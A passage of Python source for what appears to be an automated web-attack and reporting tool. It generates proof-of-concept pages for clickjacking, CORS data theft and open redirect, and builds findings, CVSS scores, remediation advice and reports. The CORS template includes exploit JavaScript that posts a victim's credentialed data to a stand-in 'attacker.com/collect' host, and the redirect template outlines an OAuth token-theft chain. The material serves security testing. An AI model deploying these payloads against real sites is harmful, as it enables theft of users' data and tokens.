            font-size: 18px;
            cursor: pointer;
            border-radius: 5px;
        }}
        /* Position decoy over target button */
        .decoy {{ top: 200px; left: 100px; }}
    </style>
</head>
<body>
    <h1>🎯 Clickjacking Proof of Concept</h1>
    <p>Target: {target}</p>
    <p>The button below is positioned over a sensitive action on the target page.</p>
    
    <div class="container">
        <button class="decoy">🎁 Click to claim your prize!</button>
        <iframe src="{target}"></iframe>
    </div>
    
    <h2>Technical Details</h2>
    <ul>
        <li>Missing <code>X-Frame-Options</code> header</li>
        <li>No <code>frame-ancestors</code> in CSP</li>
        <li>Page can be embedded in malicious iframe</li>
    </ul>
    
    <h2>Impact</h2>
    <p>An attacker could trick users into:</p>
    <ul>
        <li>Clicking sensitive buttons (delete, transfer, etc.)</li>
        <li>Submitting forms with attacker-controlled data</li>
        <li>Changing account settings</li>
    </ul>
</body>
</html>"""
    
    def _generate_cors_poc(self, target: str, evil_origin: str) -> str:
        """Generate CORS exploitation proof of concept."""
        return f"""<!-- CORS Data Theft Proof of Concept -->
<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC - Data Theft</title>
</head>
<body>
    <h1>🔓 CORS Misconfiguration - Data Theft PoC</h1>
    
    <h2>Target</h2>
    <p>{target}</p>
    
    <h2>Vulnerable Configuration</h2>
    <p>Origin <code>{evil_origin}</code> is allowed to make credentialed requests.</p>
    
    <h2>Exploit Code</h2>
    <pre>
// This code runs on attacker's domain ({evil_origin})
fetch('{target}', {{
    credentials: 'include'  // Send cookies
}})
.then(response => response.text())
.then(data => {{
    // Exfiltrate stolen data
    console.log('Stolen data:', data);
    
    // Send to attacker server
    fetch('https://attacker.com/collect', {{
        method: 'POST',
        body: JSON.stringify({{stolen: data}})
    }});
}});
    </pre>
    
    <h2>Live Demo</h2>
    <button onclick="exploit()">Steal Data</button>
    <pre id="output"></pre>
    
    <script>
    function exploit() {{
        fetch('{target}', {{
            credentials: 'include'
        }})
        .then(r => r.text())
        .then(data => {{
            document.getElementById('output').textContent = 
                'Stolen data:\\n' + data.substring(0, 500) + '...';
        }})
        .catch(e => {{
            document.getElementById('output').textContent = 'Error: ' + e;
        }});
    }}
    </script>
    
    <h2>Impact</h2>
    <ul>
        <li>Steal sensitive user data</li>
        <li>Access private API endpoints</li>
        <li>Exfiltrate tokens and credentials</li>
    </ul>
</body>
</html>"""
    
    def _generate_redirect_poc(self, target: str, param: str, evil_url: str) -> str:
        """Generate open redirect proof of concept."""
        return f"""<!-- Open Redirect Proof of Concept -->
<!DOCTYPE html>
<html>
<head>
    <title>Open Redirect PoC</title>
</head>
<body>
    <h1>↗️ Open Redirect Vulnerability PoC</h1>
    
    <h2>Vulnerable URL</h2>
    <code>{target}?{param}={evil_url}</code>
    
    <h2>Test Link</h2>
    <a href="{target}?{param}={evil_url}">Click to test redirect</a>
    
    <h2>OAuth Token Theft Chain</h2>
    <p>If this site uses OAuth, the redirect can be chained:</p>
    <pre>
1. Attacker crafts OAuth URL with malicious redirect_uri
2. Victim clicks link, authenticates
3. OAuth redirects to legitimate site with token in URL
4. Legitimate site redirects to attacker via open redirect
5. Attacker captures token from URL
    </pre>
    
    <h2>Impact</h2>
    <ul>
        <li>Phishing (redirect to fake login)</li>
        <li>OAuth token theft</li>
        <li>Bypass security filters</li>
    </ul>
</body>
</html>"""
    
    # =========================================================================
    # FINDING CREATION
    # =========================================================================
    
    def _create_finding_from_vector(
        self,
        vector: AttackVector,
        severity: str,
        cwe: str,
    ):
        """Create a finding from a successful attack vector."""
        finding = IntelligentFinding(
            id=f"FIND-{hashlib.md5(vector.name.encode()).hexdigest()[:8]}",
            title=vector.name,
            severity=severity,
            type=vector.payload_type,
            endpoint=vector.target_endpoint or self.context.target_url,
            description=vector.description,
            evidence=vector.evidence,
            poc=vector.poc,
            attack_chain=[{
                "step": "Execute",
                "action": vector.name,
                "success": True,
            }],
            business_impact=vector.expected_impact,
            cvss_score=self._calculate_cvss(severity),
            cwe=cwe,
            remediation=self._get_remediation(vector.payload_type),
            is_exploitable=True,
        )
        
        self.findings.append(finding)
        logger.info(f"[Finding] Created: {finding.title} ({severity})")
    
    def _calculate_cvss(self, severity: str) -> float:
        """Calculate CVSS score from severity."""
        scores = {
            "critical": 9.8,
            "high": 7.5,
            "medium": 5.5,
            "low": 3.0,
            "info": 0.0,
        }
        return scores.get(severity, 5.0)
    
    def _get_remediation(self, attack_type: str) -> str:
        """Get remediation advice for attack type."""
        remediations = {
            "xss": "Implement proper output encoding. Use Content-Security-Policy. Sanitize user input.",
            "clickjacking": "Add X-Frame-Options: DENY header. Implement frame-ancestors CSP directive.",
            "cors": "Restrict CORS to trusted origins. Never reflect Origin header directly.",
            "idor": "Implement proper authorization checks. Use indirect references.",
            "redirect": "Validate redirect URLs against whitelist. Use relative redirects.",
            "auth_bypass": "Implement proper authentication on all endpoints. Use middleware.",
            "sqli": "Use parameterized queries. Implement input validation.",
        }
        return remediations.get(attack_type, "Review security controls for this vulnerability type.")
    
    # =========================================================================
    # REPORT GENERATION
    # =========================================================================
    
    def generate_report(self) -> str:
        """Generate comprehensive attack report."""
        report = f"""# Intelligent Attack Report

## Executive Summary

**Target:** {self.context.target_url}
**Tech Stack:** {self.context.tech_stack.value}
**Attack Vectors Tested:** {len(self.attack_vectors)}
**Successful Exploits:** {len(self.findings)}

## Security Posture

| Protection | Status |
|------------|--------|
| CSP | {"✅ Present" if self.context.has_csp else "❌ Missing"} |
| X-Frame-Options | {"✅ Present" if self.context.has_xframe else "❌ Missing"} |
| CORS | {"⚠️ Misconfigured" if self.context.has_cors else "✅ Secure"} |

## Exploitable Vulnerabilities

"""
        
        for i, finding in enumerate(self.findings, 1):
            report += f"""### {i}. {finding.title}

**Severity:** {finding.severity.upper()}
**Type:** {finding.type}
**CWE:** {finding.cwe}
**CVSS:** {finding.cvss_score}

#### Description
{finding.description}

#### Business Impact
{finding.business_impact}

#### Evidence
```json
{json.dumps(redact_secrets_in_dict({"evidence": finding.evidence})["evidence"] if isinstance(finding.evidence, (dict, list)) else finding.evidence, indent=2, default=str)}
```

#### Proof of Concept
```html
{finding.poc[:1500] if finding.poc else "N/A"}
```

#### Remediation
{finding.remediation}

---

"""
        
        if not self.findings:
            report += "_No exploitable vulnerabilities found._\n\n"
            report += "The target appears to be well-protected against common attack vectors.\n"
        
        return report


# =============================================================================
# MAIN ENTRY POINT
# =============================================================================

async def intelligent_attack(
    target_url: str,
    initial_findings: list[dict] = None,
    http_client=None,
    rate_limiter=None,
    max_depth: int = 5,
) -> tuple[list[IntelligentFinding], str]:
    """
    Run intelligent attack analysis.
    
    Returns:
        Tuple of (findings, report)
    """
    attacker = IntelligentAttacker(http_client, rate_limiter)
    findings = await attacker.analyze_and_attack(
        target_url,
        initial_findings or [],
        max_depth,
    )
    report = attacker.generate_report()
    
    return findings, report
